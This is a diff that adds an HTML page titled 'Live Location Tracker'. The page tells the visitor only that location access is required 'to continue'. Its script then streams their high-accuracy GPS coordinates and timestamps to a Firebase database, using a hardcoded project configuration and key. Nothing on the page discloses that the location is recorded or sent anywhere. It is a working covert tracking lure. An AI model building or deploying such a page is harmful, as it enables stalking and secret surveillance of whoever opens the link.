@@ -1,0 +1,53 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Live Location Tracker</title>
+  <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js"></script>
+</head>
+<body>
+  <h2>Location Access Required</h2>
+  <p>Please allow location access to continue...</p>
+
+  <script>
+    // Your Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyB3HTUEhnLy1fq0iq95PJoiUNDu4jcjCzo",
+      authDomain: "live-tracker-e6f6a.firebaseapp.com",
+      databaseURL: "https://live-tracker-e6f6a-default-rtdb.firebaseio.com",
+      projectId: "live-tracker-e6f6a",
+      storageBucket: "live-tracker-e6f6a.firebasestorage.app",
+      messagingSenderId: "825903580998",
+      appId: "1:825903580998:web:c75b6420e6385bdf284747"
+    };
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Get location
+    if (navigator.geolocation) {
+      navigator.geolocation.watchPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+
+          // Save to Firebase
+          db.ref("users/testUser").set({
+            latitude: lat,
+            longitude: lng,
+            timestamp: Date.now()
+          });
+        },
+        (error) => {
+          console.error("Error getting location: ", error);
+        },
+        { enableHighAccuracy: true }
+      );
+    } else {
+      alert("Geolocation not supported!");
+    }
+  </script>
+</body>
+</html>
